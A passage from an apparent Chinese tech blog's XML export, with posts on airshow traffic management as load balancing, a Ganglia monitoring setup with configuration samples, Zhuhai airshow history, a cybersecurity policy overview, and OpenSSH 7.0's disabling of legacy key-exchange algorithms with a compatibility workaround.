治理目标：1、保障展会沿途交通线路通畅：即最大限度提升现有基础设施的通行效率，同时管控流量波动，防止超过预期的突发峰值；2、提供弹性扩容能力，预留一定冗余容量，突发事件预案；3、不能明显影响现有生产业务（城市功能仍需正常运转）。 解决方案一、总量预算a) 公众日每天进场人数不超8万人b)取消现场售票，提高展区周边通行效率，也防止无序流量；c) 取消三日通票，按日售票，通过票务系统引导，分摊每日流量负荷。 最难的恐怕是测算。根据官方通报，主要由道路交通、餐饮等现场承载力测算，应该会参考往年的历史数据，旅行社市场调研情况，甚至可能是官网访问点击数据等。当然实际过程应该比较复杂，暂时没有一手信息，暂且掠过。 另外，技术上测算完了之后，也需要有人敢于为决策拍板。毕竟测算失误，是需要承担责任风险的，压力环境下如何决策是很值得研究的。总之，技术决策过程，都需要有一个人能下最后决心的。 二、流量路径规划第一，优先保障航展核心区交通顺畅；第二，设置外围停车场，实行小客车“P+R”停车换乘第三，安排大运量公共交通接驳，减少核心展区交通压力；第四，设置航展专用车道，保障公交、旅游包车等优先通行；第五，最薄弱环节珠海大道启用同向红绿灯，增设导流实线。 往届现场车辆大排长龙的景像今年没有出现，一路畅通。从技术上分析，上述方案能够取得明显效果，主要思路是一致的，即采用“负载均衡+缓存”机制，适当降低某些业务的优先级和时延，提升通行效率，保证整体可用性。具体表现为： 1、负载均衡针对全线关键薄弱环节的瓶颈，将分流管制区放在珠海大桥之前，将大客车和自驾车流量分离，实际上起到了负载均衡的作用。负载均衡算法增加了大客车的优先权重，虽然会增加自驾车20分钟左右的绕行时间，但是保证了系统整体可用。比起大车小车挤成罐头的惨烈场景，这点损耗非常划算。 另外，在珠海大道开启二级负载均衡。主要措施：启用同向红绿灯，红绿灯口被重新划分为6个车道，每个车道会对应一个信号灯组，增设导流实线。限制加塞变道、不同方向车流抢道的现象发生。 2、缓存机制 一级缓存：自驾车换乘区。将小型自驾车引导进入附近的换乘停车场，而不是直接驶入核心区，中间调用大客车接驳。减少核心区的空间压力，也能聚拢零散客流。 二级缓存：核心区停车场。根据当时现场情况观察，展区周边的停车位经过统一规划，几乎没有乱停乱摆的情况发生。所有观展客流下车即进入验票口的蛇形验票队伍，出来即可换乘接驳大巴，团进团出，不会存在以往核心区滞留人群混乱的局面。 3、实时监控能力升级 例如 无人机：：使用无人机监控道路、停车场地等，提供更灵活的巡逻方式，扩大巡逻覆盖面。既缓解警力不足问题，也减少监控死角，对于潜在违规驾驶人也有一定震慑作用，有利于规范道路行车秩序。 高德地图：当地警方与高德地图合作，航展期间将联合运营实现出行道路交通管制信息和场馆周边停车场、换乘点等信息的实时发布，引导观众避开拥堵路段。此外，出租车GPS可视化系统、高配置的警用摩托车等装备也有一定特色。 上述方案能够落实到位，我相信是与大量引用新型技术密不可分的。 2016珠海航展图集 2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 扩展阅读参考文献 张逸：交通堵塞与性能优化 酷壳：缓存更新的套路 拥塞控制：排队理论，控制理论Bomb250@排队系统拥塞控制的位置]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈:基于 Ganglia 实现集群性能态势感知]]></title>
    <url>%2F2016%2F11%2F04%2FOpenSource-Ganglia%2F</url>
    <content type="text"><![CDATA[摘要本文以开源项目Ganglia为例，介绍多集群环境下，利用监控系统进行故障诊断、性能瓶颈分析的一般方法。 回顾通过前面的发布过的两篇文章，我们已经大致掌握了描述单个服务器的性能情况的方法。可以从load avgerage等总括性的数据着手，获得系统资源利用率（CPU、内存、I/O、网络）和进程运行情况的整体概念。参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。也可以在60秒内，通过运行以下10个基本命令，判断是否存在异常、评估饱和度，度量请求队列长度等等。 1.基于Linux单机的负载评估 2.Netflix性能分析模型：In 60 Seconds 在真实的工程实践中，并不能总是通过几行简单的命令，直接获得性能问题的答案。一般不会存在一台单独运行的服务器，它们一定属于某个服务集群之中，就算是同一集群的服务器，也可能属于不同建设周期、硬件配置不同、分工角色不同。或者由不同机房、不通集群的服务器共同协作完成任务。 另外，很多性能问题也需要长时间的追踪、对比才能作出判断。正如任何一个高明的医生，都需要尽可能多地了解、记录病人的病史，不掌握这些情况，盲目下药，无异于庸医杀人。诚如医者曰： 1234夫经方之难精，由来尚矣。今病有内同而外异，亦有内异而外，故五脏六腑之盈虚，血脉荣卫之通塞，固非耳目之所察，必先诊候以审之。世有愚者，读方三年，便谓天下无病可治；及治病三年，乃知天下无方可用。 基于 Ganglia 项目我们可以快速搭建一套高性能的监控系统，展开故障诊断分析、资源扩容预算甚至故障预测。 Ganglia框架简析 一般应用中，需要用到两个核心组件： Gmond （Ganglia Monitoring Daemon）Gmond承担双重角色：1、作为Agent，部署在所有需要监控的服务器上。2、作为收发机，接收或转发数据包。 Gmetad (Ganglia Meta Daemon)负责收集所在集群的数据，并持久化到RRD数据库。根据集群的组网情况，可以部署1-N个。 Web frontendGanglia项目提供一个PHP编写的通用型的Web包，主要实现数据可视化，能提供一些简单的数据筛选UI。页面不多，大量使用了模版技术。HTTP Server方面，用Apache和Nginx都可以。 RRDTool (Round Robin Database)Gmetad收集的时间序列数据都通过RRD存储，RRDTool作为绘图引擎使用。 插件生态Ganglia最重要的特性之一就是提供了一个灵活的数据标准和插件API。它使得我们可以根据系统的情况，很容易地在默认的监控指标集之上，引用或定制其他扩展指标。这一特性在大数据领域也获得了认可，Hadoop,Spark等都开放了面向Ganglia的指标集。在Github上也有很多现成的扩展插件。 Ganglia工作模式项目的名称其实已经反映了作者的设计思路。Ganglia（又作：ganglion）,直译为“神经节”、“中枢神经”。在解剖学上是一个生物组织丛集，通常是神经细胞体的集合。在神经学中，神经节主要是由核周体和附随连结的树突组合而成。神经节经常与其他神经节相互连接以形成一个复杂的神经节系统。神经节提供了身体内不同神经体系之间的依靠点和中介连结，例如周围神经系统和中枢神经系统。 Ganglia的作者意图将服务器集群理解为生物神经系统，每台服务器都是独立工作神经节，通过多层次树突结构连接起来，既可以横向联合，也可以从低向高，逐层传递信息。具体例证就是Ganglia的收集数据工作可以工作在单播（unicast)或多播(multicast)模式下，默认为多播模式。 单播：Gmond收集到的监控数据发送到特定的一台或几台机器上，可以跨网段 多播：Gmond收集到的监控数据发送到同一网段内所有的机器上，同时收集同一网段内的所有机器发送过来的监控数据。因为是以广播包的形式发送，因此需要同一网段内。但同一网段内，又可以定义不同的发送通道。 vi /usr/local/ganglia/etc/gmond.conf 默认配置：123456789101112131415161718192021cluster &#123; name = &quot;cluster01&quot;&#125;udp_send_channel &#123; mcast_join = 239.2.11.71 port = 8649 ttl = 1&#125;udp_recv_channel &#123; mcast_join = 239.2.11.71 port = 8649 bind = 239.2.11.71 retry_bind = true&#125;tcp_accept_channel &#123; port = 8649 gzip_output = no&#125; 单播模式Gmetad增加配置：123udp_recv_channel &#123; port = 8666&#125; 单播模式Gmond增加配置：12345udp_send_channel &#123; host = 192.168.0.39 port = 8666 ttl = 1&#125; 默认装载指标集： 123456789101112131415161718192021222324252627282930313233modules &#123; module &#123; name = &quot;core_metrics&quot; &#125; module &#123; name = &quot;cpu_module&quot; path = &quot;modcpu.so&quot; &#125; module &#123; name = &quot;disk_module&quot; path = &quot;moddisk.so&quot; &#125; module &#123; name = &quot;load_module&quot; path = &quot;modload.so&quot; &#125; module &#123; name = &quot;mem_module&quot; path = &quot;modmem.so&quot; &#125; module &#123; name = &quot;net_module&quot; path = &quot;modnet.so&quot; &#125; module &#123; name = &quot;proc_module&quot; path = &quot;modproc.so&quot; &#125; module &#123; name = &quot;sys_module&quot; path = &quot;modsys.so&quot; &#125;&#125; vi /usr/local/ganglia/etc/gmetad.conf 12345678### 配置数据源，可以多个data_source &quot;cluster01&quot; localhost:8649 data_source &quot;cluster02&quot; 192.168.0.39:8666 192.168.0.48:8666gridname &quot;mygrid&quot;### 指定RRD数据路径rrd_rootdir &quot;/home/data/ganglia/rrds&quot; 查看数据流向12345# netstat -an | grep 86 tcp 0 0 0.0.0.0:8649 0.0.0.0:* LISTEN ##tcp_accept_channeludp 0 0 192.168.0.45:52745 239.2.11.71:8649 ESTABLISHED ##组播udp 0 0 239.2.11.71:8649 0.0.0.0:* udp 0 0 0.0.0.0:8666 0.0.0.0:* ##udp_recv_channel Gmetad所在位置，已经可以收到监控数据的服务器列表：12345# telnet localhost 8649 | grep HOST&lt;HOST NAME=&quot;192.168.0.56&quot; IP=&quot;192.168.0.56&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226772&quot; TN=&quot;6&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477817579&quot;&gt;&lt;/HOST&gt;&lt;HOST NAME=&quot;192.168.0.39&quot; IP=&quot;192.168.0.39&quot; TAGS=&quot;&quot; REPORTED=&quot;1478226771&quot; TN=&quot;7&quot; TMAX=&quot;20&quot; DMAX=&quot;86400&quot; LOCATION=&quot;GZ&quot; GMOND_STARTED=&quot;1477473541&quot;&gt;...... Gmond所在位置，收到的监控指标数据明细：1234567891011# telnet localhost 8649 | grep cpu_idletelnet: connect to address ::1: Connection refused&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.7&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;33&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;100.0&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;20&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;91.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;4&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;96.3&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;28&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;99.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;5&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;83.9&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;14&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;84.2&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;0&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;&lt;METRIC NAME=&quot;cpu_idle&quot; VAL=&quot;44.1&quot; TYPE=&quot;float&quot; UNITS=&quot;%&quot; TN=&quot;9&quot; TMAX=&quot;90&quot; DMAX=&quot;0&quot; SLOPE=&quot;both&quot;&gt;...... 数据可视化 扩展阅读1没有任何一个开源项目是完美的。 1、告警流程框架：Ganglia本身并不具备，可以选用 Nagios 补充。https://www.ibm.com/developerworks/library/l-ganglia-nagios-1/https://www.quora.com/Ganglia-vs-collectd-vs-cacti-advantage-and-disadvantage 2、日志管理框架：Ganglia本身并不具备，可以选用 Splunk 补充。 3、性能开销预算 对于单纯的Gmond节点来说，性能开销很低。主要的瓶颈在中央节点。 各节点的gmond进程向中央节点发送的udp数据带来的网络开销。如果一个节点每秒发10个包，1000个节点将会发出10000个，每个包有200字节，就有2m字节，10000个包的处理所需要的cpu使用也会上升。 Gmetad默认15秒向gmond取一次xml数据,解析xml文件带来的CPU负荷也会随着管理节点数线性增长。 格外需要注意的是RRD的写入瓶颈。实际应用中需要根据资源情况，调整采样频率、权衡指标数量、引入RRDCached等方式优化。 4、网络流向监控：Ganglia原生支持sFlowGitHub:gmond-proxy project。what are some of the benefits of using the proxy? Firstly, the proxy allows metrics to be filtered, reducing the amount of data logged and increasing the scaleability of the Ganglia collector. Secondly, sFlow-RT generates traffic flow metrics, making them available to Ganglia. Finally, Ganglia is typically used in conjunction with additional monitoring tools that can all be driven using the analytics stream generated by sFlow-RT. 5、可视化 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 Ganglia Develop Team Matt Massie:UCB Brent Chun:Developer,UCB David E. Culler:Professor 读者讨论区 隔壁_老吴 ：多播如何跨网段？因为单播需要在服务器端添加所有agent IP，上百台不现实 扩展阅读：开源架构技术漫谈 DevOps 漫谈：基于OpenCensus构建分布式跟踪系统 基于Go语言快速构建一个RESTful API服务 基于Kafka构建事件溯源型微服务 远程通信协议：从 CORBA 到 gRPC 应用程序开发中的日志管理(Go语言描述) 数据可视化（七）Graphite 体系结构详解 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux DevOps 资讯 | LinkedIn 开源 Kafka Monitor 参考文献 统一监控报警平台架构设计思路|Ganglia+Centreon]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[摄影专辑:珠海航空航天展览]]></title>
    <url>%2F2016%2F10%2F15%2FArtistic-Zhuhai-AirShow%2F</url>
    <content type="text"><![CDATA[摘要 珠海市为何是中国航展举办地？ 2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 知乎上有一个问题：珠海市为何是中国航展举办地？ 珠海市的地理位置，经济发展水平，政治地位等方面并不具备举办国家级航展的优势条件，20年来很多大城市都跃跃欲试，欲取而代之。它对标的是法国巴黎航展，兼具大规模飞行表演，是目前中国规模最大（北京航展主要以静态站台为主，石家庄航展以通用航空为主）。 先下手为强1992年，珠海政府代表团访问加拿大的苏里市，当时珠海正与之结为姐妹城市。在苏里市的市政厅，梁广大介绍珠海的发展情况，说珠海经济特区要开展铁路、港口、飞机场和大桥等大型设施建设。在市政厅里的会客厅咖啡室，一位议员，马文•亨特，提出建议：“你们建飞机场的时候，能不能把航展的功能考虑进去，我是国际航展成员，国际航空航天博览会是一个很大的商业项目活动，对一个地区，对一个国家都很有好处。” 听着这么像资本市场融资故事呢？机场还没修呢。 4000米跑道民航总局批复的规划跑道是2000多米，经过地方政府多次公关，最终民航总局同意批准加建到3200米。如果作为普通的民航机场，一般的机场跑道3200米已经很不错了，但考虑到要建一个国际性机场，跑道短了些，后来又决定加码到了3400米，可以起降波音747等大型客机。最后建设的时候，跑道延伸到了4000米。 当时，全国还没有一个机场拥有4000米的跑道，但这几百米的改动，因为未及时向国家主管部门和国务院报告和审批，导致机场建好后，谁也不敢来验收。各方面的反对意见很多。建那么长干嘛？民航又不需要那么长。最后捅到了国务院办公会议。 “我向朱镕基总理汇报，超出最初规划建设机场，目的主要是为了办国际航空航天博览会。除了跑道，机场的导航系统、地勤系统，我们采用的都是世界最先进的。”——时任珠海市委书记梁广大 机智？ 格局 ？ 真相永远不可考。 等级 机场名称 IATA代码 跑道长度宽度指标（米）4E 珠海三灶(金湾)机场 ZUH 4000×60 4F 北京首都国际机场 PEK 3800×60、3200×50、3800×604F 上海浦东国际机场 PVG 4000×60、3800×60、3400×604F 广州白云国际机场 CAN 3800×60、3600×45 4E 长沙黄花国际机场 CSX 3200×604E 厦门高崎国际机场 XMN 3400×454E 台湾桃园国际机场 TPE 3660×60、3800×60 特色审批机场有了，报批航展的手续也在紧锣密鼓地推进中。梁广大本以为只要珠海市里下定决心举办，再报批一下民航总局，珠海航展的成功就是指日可待。实际上，从1994年1月22日开始，珠海市政府就向国务院请示，在珠海举办中国国际航空航天博览会，直到1995年5月19日，国务院才给予了正式批复。 “后来慢慢才知道，牵扯的部门那么多，有经贸部、贸促会、海关总署、航空工业部、外交部、军委外事部门、总参、空军总部、国防科工委、军委、国务院办公厅、中央办公厅”。梁广大带着一帮人在北京珠海奔波了几乎有一年，拜访了十几个单位，挨家挨户地陈述申办理由。 最难的一关是国防科工委。航展关系到外国飞机和武器的进出，事关领空开放和安全问题，答复批不了，要军委主席才可以批。“总书记的批示让我们举办国际航空航天博览会的工作变得畅通无阻。” 找对人很重要。 后记综上所述，珠海办航展这事，基本上是梁书记提着脑袋忽悠来的。可是很可惜，第一届航展两年之后，一代能吏梁大胆调职退休，珠海经济特区迎来了漫长的平庸期，直到今天。 历任珠海市委书记任期 姓名2012.02 - 2016.04 李 嘉 （4年，涉嫌严重违纪，免职）2008.03 - 2012.02 甘 霖（4年）2005.08 - 2008.03 邓维龙（2.5年）2002.08 - 2005.08 方 旋（3年）1998.10 - 2002.08 黄龙云（4年）1987.01 - 1998.09 梁广大（11年，84年任市长）1984.02 - 1987.01 方 苞1979.01 - 1984.02 吴健民 拓展阅读2016年珠海航展图集 2016珠海航展 中国八一飞行表演队 2016珠海航展 俄罗斯勇士&amp;雨燕飞行表演队 2016珠海航展 英国皇家空军红箭飞行表演队 资源 NASA 图文资源库 参考文献 Highlights from the 2019 Paris Air Show]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>摄影</tag>
        <tag>Artistic</tag>
        <tag>Sport</tag>
        <tag>讲武堂</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全专题 | Overview of Cyber-Security]]></title>
    <url>%2F2016%2F10%2F07%2FCyberSecurity%2F</url>
    <content type="text"><![CDATA[摘要 The Big Picture 法律视角 组织视角 经济视角 技术视角 一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。——《凤凰项目 一个IT运维的传奇故事》第 241 页 The Big Picture法律视角 The Red Army had been gone for years, but it still had the power to inspire controversy—and destruction……the same sorts of challenges the modern administrative state faces in fields like environmental law, antitrust law, products liability law, and public health law. –《Regulating Cybersecurity》 (forthcoming 2013)。 美国网络安全立法策略学术界普遍认为国家的关键基础设施，如银行，电信网络，电网等等，非常容易受到灾难性的网络攻击。然而，现有的学术文献并未充分阐述这一问题，因其将网络安全的范畴过度狭隘化。作者认为，与其仅仅将这些私有企业视为网络犯罪的潜在受害者或是网络冲突的潜在目标，我们更应从行政法的范畴来看待他们。在诸如环境法，反垄断法，产品责任法，公共卫生法等领域也面临相似的挑战。这些法律范畴不仅产出一个思考网络安全的更丰富的分析框架，也提出了可能的应对策略。 Environmental Law 环保法 Antitrust Law 反托拉斯法 反垄断法 Products liability Law 产品责任法 Public Health Law 公共卫生法 a DDOS attack, and the company might notify other firms to use the same technique. Finally, an industry might agree to establish a uniform set of cyber-security standards, along with monitoring and enforcement mechanisms to ensure that all members are implementing the agreed-upon measures. They might, in other words, form something like a cartel. 例如，面对DDOS 攻击的严重威胁，作者提出行业公司可能会同意建立一套统一的网络安全标准，以及监测和执法机制，确保所有成员都执行商定的措施。类似于一个卡特尔组织。 a partnership among the U.S. Centers for Disease Control and Prevention, the CDC’s state level counterparts, and front line health care providers, such as hospitals, clinics, and individual medical practitioners. 又例如，借鉴公共卫生领域的诸多实践经验：强制接种（mandatory inoculations ）、监测网（Monitor）、隔离（isolation and quarantine ）、机构协作等。与其授权某个单独的监管者检测恶意代码爆发的网络流量，应该给私营企业分派任务，报告他们经历的漏洞和威胁信息，就像医院向公共卫生当局汇报一样。为了激励企业参与分布式检测网络，他们会获得不同的补助（基于网络安全数据是一种市场上供不应求的公共财产理论）以及免责权利（例如反垄断法豁免权）。 再比如：网络入侵的最优水平不为零，网络安全的支出最优水平是无穷的。从经济角度来说，目标是控制攻击数水平，而不是防止所有的攻击。 科斯的经济理论可以说是这篇文章的精魂所在。罗纳德·哈里·科斯（Ronald H Coase）——新制度经济学的鼻祖，美国芝加哥大学教授、芝加哥经济学派代表人物之一，1991年诺贝尔经济学奖的获得者。两篇代表作《企业的性质》和《社会成本问题》之中，科斯首次创造性地通过提出“交易费用”来解释企业存在的原因以及企业扩展的边界问题。 这样的例子还很多，感兴趣的朋友可以阅读原文。 作者NATHAN ALEXANDER，经历非常丰富。学术背景以外，还有美国司法部、国土安全部任职、海外派驻经历，从华盛顿出来之后，又回到学校去教书。可能是这些丰富地经历，造就了他开阔地思路，没有非敌即我的简单思维，有很强的经济学功底，环保法、反托拉斯法、公共卫生法信手拈来，对网络安全领域的参与主体、攻击技术、专业细节的掌握相当内行，和一般的学者不同。这套旋转门的制度设计还是很神奇地。 GEORGE MASON UNIVERSITY SCHOOL OF LAW，Arlington，VAAssistant Professor of Law (January 2008) DEPARTMENT OF HOMELAND SECURITYDeputy Assistant Secretary for Policy Development(2006-2007) GEORGETOWN UNIVERSITY LAW CENTER，Washington，DCDUKE UNIVERSITY SCHOOL OF LAW，Durham，NC 组织视角香港警务处网络安全与科技罪案调查科网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。more details &gt;&gt;&gt;&gt; 经济视角 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: 事与愿违的后门程序 | Economist 实现安全性的目标必须强调可操作性 所有安全系统最终依赖于用户对安全重要性的认识，以及对其必然带来的限制的接受。安全取决于人：取决于系统用户对规则的遵守，取决于分析人员和监控人员在规则被破坏时能够发现。…… 糟糕的安全策略会导致用户不断地躲避检测，以便完成其工作，或者使用户不停地发脾气，这只会给你的防御人员带来额外的负担。—— Michael Collins《Network Security Through Data Analysis》 技术视角 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 扩展阅读:《The Cyber-Security Master》参考文献 How do you keep your DCS safe from CyberAttacks? 安全情报分析中的钻石模型 | 2015-12-14 安全威胁情报 乌克兰电网攻击第二季 | 2016-01-31 安全威胁情报 加油站也会被黑？来看看这个攻击案例|2017-02-19 clouds FreeBuf 360副总裁谭晓生谈安全：万物互联时代，要玩儿“塔防游戏”，不是“工程游戏 ”|BT500人峰会 池建强&amp;双乐：DDoS，网络安全世界里的暗黑杀手 全网统一账户实践(OpenLDAP) |jaseywang.me]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:OpenSSH并不绝对安全]]></title>
    <url>%2F2016%2F10%2F06%2FCyberSecurity-SSH%2F</url>
    <content type="text"><![CDATA[摘要OpenSSH7.0做出了一些变更，默认禁用了一些较低版本的密钥算法。受此影响，在同一系统中的主机、网络设备必须同步升级，或者开启兼容选项。 实测中，也有某些厂家产品内核的原因，甚至无法升级。由此案例，关于系统版本管理、安全、架构、开源文档，甚至采购方面，都可以引发很多思考。 背景某系统按照安全管理要求，需对全系统主机的OpenSSH版本升级。第一次测试：系统自有服务器。主机：RedHat Linux ／SunOS：系统内全部主机升级，内部互通没有问题第二次测试：主机到网络设备SSH互通性 国外厂商思科（系统版本IOS 12.0系列，IOS 4.0系列），RedBack（系统版本SEOS-12系列，SEOS-6.0系列）。目前仅支持diffie-hellman-group1-sha1、ssh-dss两种算法。当然不排除今年国产化运动影响，国外厂商维保过期等原因导致的售后升级服务滞后。 国内厂商华为，无论是城域骨干网设备，还是IPRAN 各型号，甚至老式交换机都完全兼容。中兴，只有较新的CTN9000-E V3.00.10系列能有限支持diffie-hellman-group1-sha1，其它各型号在服务器OpenSSH7.0以上版本后都无法正常访问。 原因解析直接原因：OpenSSH7.0安全特性升级基于安全考虑，OpenSSH7.0将diffie-hellman-group1-sha1，ssh-dss等运行时状态默认变更为禁用。Support for the 1024-bit diffie-hellman-group1-sha1 key exchange is disabled by default at run-time.Support for ssh-dss, ssh-dss-cert- host and user keys is disabled by default at run-time 采购原因：国产化运动国产化是近年以来的国家战略，各行各业都有涉及。在本次案例中，国际大厂Cicso,RedBack,Juniper等，个人以为更大的可能不是无法更新，而是基于商务原因。既然你不在维保合同期之内，又没有继续采购的计划，那我干嘛还给你升级？甚至由此可以推论：针对在网国外厂商设备，漏洞多又没有升级保障，会变成攻击和防护的重灾区。 软件质量：厂商系统架构水平差异同样是国内厂家，测试对比结果却非常强烈！！这其实是没有想到的。通过这个小细节，可以看出华为的系统架构与中兴早已拉开境界上的差距。结合近年来，华为出入开源社区的身影，更可以说明其对系统内核的理解和掌握已经到了相当的程度。个人揣测，其早期版本可能也没有多好的支持。由于架构设计较好，又有更高的自我要求，逐步通过补丁升级，不动声色地就更新好了。持续升级能力，可以作为评价企业长期 OpenSSH7.0以后的演进针对密钥强度和加密算法方面更新会持续加强，必须有所准备We plan on retiring more legacy cryptography in the next releaseincluding: Refusing all RSA keys smaller than 1024 bits (the current minimumis 768 bits) Several ciphers will be disabled by default: blowfish-cbc,cast128-cbc, all arcfour variants and the rijndael-cbc aliasesfor AES. MD5-based HMAC algorithms will be disabled by default. 延伸：Logjam Attack（本人没查到对应的中文名称，暂翻译为“僵尸攻击”，欢迎指正）一种针对Diffie-Hellman密钥交换技术发起的攻击，而这项技术应用于诸多流行的加密协议，比如HTTPS、TLS、SMTPS、SSH及其他协议。一个国外计算机科学家团队2015-5-20公开发布。 延伸：开源组件演进追踪本案例实际操作过程中，开头走了很多弯路，并没有一下找到要害。根源在于团队缺乏关注开源产品演进方向的意识和习惯，也缺乏直接阅读、理解官方文档的习惯。 OpenSSH 7.0 变更说明Changes since OpenSSH 6.9This focus of this release is primarily to deprecate weak, legacyand/or unsafe cryptography.Security——– sshd(8): OpenSSH 6.8 and 6.9 incorrectly set TTYs to be world-writable. Local attackers may be able to write arbitrary messagesto logged-in users, including terminal escape sequences.Reported by Nikolay Edigaryev. sshd(8): Portable OpenSSH only: Fixed a privilege separationweakness related to PAM support. Attackers who could successfullycompromise the pre-authentication process for remote codeexecution and who had valid credentials on the host couldimpersonate other users. Reported by Moritz Jodeit. sshd(8): Portable OpenSSH only: Fixed a use-after-free bugrelated to PAM support that was reachable by attackers who couldcompromise the pre-authentication process for remote codeexecution. Also reported by Moritz Jodeit. sshd(8): fix circumvention of MaxAuthTries using keyboard-interactive authentication. By specifying a long, repeatingkeyboard-interactive “devices” string, an attacker could requestthe same authentication method be tried thousands of times ina single pass. The LoginGraceTime timeout in sshd(8) and anyauthentication failure delays implemented by the authenticationmechanism itself were still applied. Found by Kingcope. Potentially-incompatible Changes Support for the legacy SSH version 1 protocol is disabled bydefault at compile time. Support for the 1024-bit diffie-hellman-group1-sha1 key exchangeis disabled by default at run-time. It may be re-enabled usingthe instructions athttp://www.openssh.com/legacy.html Support for ssh-dss, ssh-dss-cert-* host and user keys is disabledby default at run-time. These may be re-enabled using theinstructions at http://www.openssh.com/legacy.html Support for the legacy v00 cert format has been removed. The default for the sshd_config(5) PermitRootLogin option has changed from “yes” to “prohibit-password”. PermitRootLogin=without-password/prohibit-password now bans allinteractive authentication methods, allowing only public-key,hostbased and GSSAPI authentication (previously it permitted keyboard-interactive and password-less authentication if those were enabled). 解决方案（翻译）OpenSSH实现了所有符合SSH标准的加密算法，使得应用之间可以互相兼容，但是自从一些老式的算法被发现不够强壮以来，并不是所有的算法都会默认启用。当OpenSSH拒绝连接一个只支持老式算法的应用时，我们该如何做呢？当一个SSH客户端与一个服务端建立连接的时候，两边会互相交换连接参数清单。清单包括用于加密连接的编码信息，消息认证码（MAC）用于防止网络嗅探篡改，公钥算法可以让服务端向客户端证明它是李刚（我就是我，而不是另一个“我”），密钥交换算法是用来生成每次连接的密钥。在一次成功的连接中，这里的每个参数必须有一组互相支持的选择。当客户端和服务端通讯的时候，不能匹配到一组互相支持的参数配置，那么这个连接将会失败。OpenSSH(7.0及以上版本）将输出一个类似的错误信息：12Unable to negotiate with 127.0.0.1: no matching key exchange method found.Their offer: diffie-hellman-group1-sha1 在这种情况下，客户端和服务端不能够就密钥交换算法达成一致。服务端只提供了一个单一的算法 ：diffie-hellman-group1-sha1。OpenSSH可以支持这种算法，但是它默认不启用，因为这个算法非常弱，理论上存在僵尸攻击的风险。这个问题的最好的解决方案是升级软件。 OpenSSH 禁用的算法，都是那些我们明确不推荐使用的，因为众所周知它们是不安全的。在某些情况下，立科升级也许是不可能的，你可能需要临时地重新启用这个较弱的算法以保持访问。在上面这种错误信息的情况下，OpenSSH 可以配置启用 diffie-hellman-group1-sha1 密钥交换算法（或者任何其它被默认禁用的），可通过KexAlgorithm选项－或者在命令行：1ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 